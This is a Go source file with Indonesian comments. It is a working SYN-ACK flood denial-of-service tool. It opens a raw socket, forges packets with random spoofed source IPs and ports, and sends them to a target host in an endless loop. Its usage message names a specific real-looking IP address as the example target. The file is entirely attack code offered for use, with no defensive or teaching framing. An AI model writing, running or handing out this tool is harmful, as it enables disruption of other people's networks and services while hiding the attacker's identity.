package main

import (
	"crypto/rand"
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"os"
	"syscall"
	"time"
)

// Menghitung Checksum untuk IP dan TCP Header
func checksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum > 0xffff {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return uint16(^sum)
}

// Menghasilkan IP publik acak (menghindari Kelas E: 240-255 dan lokal)
func getRandomIP() [4]byte {
	var ip [4]byte
	for {
		rand.Read(ip[:])
		// Validasi agar tidak menggunakan IP lokal atau Kelas E yang tidak valid di internet
		if ip[0] != 0 && ip[0] != 10 && ip[0] != 127 && ip[0] != 192 && ip[0] < 240 {
			break
		}
	}
	return ip
}

// Menghasilkan Port acak (1024 - 65535)
func getRandomPort() uint16 {
	var b [2]byte
	rand.Read(b[:])
	port := binary.BigEndian.Uint16(b[:])
	if port < 1024 {
		port += 1024
	}
	return port
}

func main() {
	// Flag/Argumen Command Line
	targetIPStr := flag.String("t", "", "IP Target (Destinasi)")
	targetPort := flag.Int("p", 80, "Port Target")
	ifaceName := flag.String("i", "eth0", "Interface Jaringan (misal: eth0)")
	flag.Parse()

	if *targetIPStr == "" {
		fmt.Println("Error: IP Target wajib diisi! Gunakan flag -t")
		fmt.Println("Contoh: sudo ./gosynackflood -t 45.192.223.67 -i eth0 -p 80")
		os.Exit(1)
	}

	targetIP := net.ParseIP(*targetIPStr).To4()
	if targetIP == nil {
		fmt.Println("Error: Format IP Target tidak valid!")
		os.Exit(1)
	}

	fmt.Printf("Memulai SYN-ACK Flood ke %s:%d via %s...\n", *targetIPStr, *targetPort, *ifaceName)
	time.Sleep(1 * time.Second)

	// 1. Membuat Raw Socket (AF_INET, SOCK_RAW, IPPROTO_RAW)
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		fmt.Printf("Gagal membuat socket: %v (Apakah Anda sudah menjalankan dengan sudo?)\n", err)
		os.Exit(1)
	}
	defer syscall.Close(fd)

	// 2. Ikat (Bind) ke Interface Jaringan (seperti eth0)
	err = syscall.BindToDevice(fd, *ifaceName)
	if err != nil {
		fmt.Printf("Gagal mengikat ke interface %s: %v\n", *ifaceName, err)
		os.Exit(1)
	}

	// Alamat tujuan untuk fungsi Sendto
	var destAddr [4]byte
	copy(destAddr[:], targetIP)
	sockAddr := syscall.SockaddrInet4{
		Port: *targetPort,
		Addr: destAddr,
	}

	// Buffer paket: 20 byte (IP Header) + 20 byte (TCP Header) = 40 byte
	packet := make([]byte, 40)

	// --- STRUKTUR TETAP IP HEADER ---
	packet[0] = 0x45 // Version: 4, Header Length: 5 (20 bytes)
	packet[1] = 0x00 // Type of Service
	binary.BigEndian.PutUint16(packet[2:4], 40) // Total Length (40 bytes)
	binary.BigEndian.PutUint16(packet[4:6], 54321) // Identification
	binary.BigEndian.PutUint16(packet[6:8], 0x0000) // Flags & Fragment Offset
	packet[8] = 64   // TTL (Time to Live)
	packet[9] = 6    // Protocol: TCP (6)
	copy(packet[16:20], targetIP) // Destination IP

	// --- STRUKTUR TETAP TCP HEADER ---
	binary.BigEndian.PutUint16(packet[22:24], uint16(*targetPort)) // Dest Port
	binary.BigEndian.PutUint32(packet[24:28], 1234567)             // Sequence Number
	binary.BigEndian.PutUint32(packet[28:32], 7654321)             // Acknowledgment Number
	packet[32] = 0x50 // Data Offset: 5 (20 bytes), Reserved: 0
	
	// ==========================================
	// NILAI CRITICAL: FLAG SYN-ACK (0x12)
	// ==========================================
	packet[33] = 0x12 // Bitmask: ACK (0x10) + SYN (0x02) = 0x12
	
	binary.BigEndian.PutUint16(packet[34:36], 1024) // Window Size

	// Perulangan Tanpa Batas (Flood Loop)
	for {
		srcIP := getRandomIP()
		srcPort := getRandomPort()

		// Sisipkan IP Sumber Acak ke IP Header
		copy(packet[12:16], srcIP[:])
		// Reset Checksum IP ke 0 sebelum dihitung ulang
		packet[10] = 0x00
		packet[11] = 0x00
		binary.BigEndian.PutUint16(packet[10:12], checksum(packet[0:20]))

		// Sisipkan Port Sumber Acak ke TCP Header
		binary.BigEndian.PutUint16(packet[20:22], srcPort)

		// Menghitung Checksum TCP menggunakan Pseudo Header (Aturan Protokol TCP)
		packet[36] = 0x00
		packet[37] = 0x00
		pseudoHeader := make([]byte, 12+20)
		copy(pseudoHeader[0:4], srcIP[:])       // Source IP
		copy(pseudoHeader[4:8], targetIP)       // Dest IP
		pseudoHeader[8] = 0                     // Reserved
		pseudoHeader[9] = 6                     // Protocol TCP
		binary.BigEndian.PutUint16(pseudoHeader[10:12], 20) // Panjang TCP (20 byte)
		copy(pseudoHeader[12:], packet[20:40]) // Mengopi TCP header asli
		
		binary.BigEndian.PutUint16(packet[36:38], checksum(pseudoHeader))

		// Tembak Paket!
		err := syscall.Sendto(fd, packet, 0, &sockAddr)
		if err != nil {
			fmt.Printf("Socket: %d.%d.%d.%d:%d -> %s:%d | Status: GAGAL (%v)\n", 
				srcIP[0], srcIP[1], srcIP[2], srcIP[3], srcPort, *targetIPStr, *targetPort, err)
		} else {
			fmt.Printf("Socket: %d.%d.%d.%d:%d -> %s:%d | Status: SYN-ACK TERKIRIM\n", 
				srcIP[0], srcIP[1], srcIP[2], srcIP[3], srcPort, *targetIPStr, *targetPort)
		}
	}
}

